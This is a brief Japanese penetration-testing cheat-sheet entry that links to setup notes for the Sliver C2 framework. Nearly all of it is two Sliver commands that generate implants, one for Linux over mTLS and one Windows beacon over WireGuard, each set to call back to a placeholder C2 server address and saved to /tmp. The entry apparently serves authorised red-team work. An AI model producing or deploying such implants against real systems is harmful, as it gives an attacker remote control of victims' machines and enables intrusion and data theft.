サーバ・クライアントの立ち上げ方は[[PT チートシート/0.インフラ/Sliver C2|こちら]]
```sh
sliver > generate --mtls C2-Server-IP:PORT --os linux --arch amd64 --save /tmp/
sliver > generate beacon --wg C2-SERVER_IP:PORT --os windows --save /tmp/agt.exe
```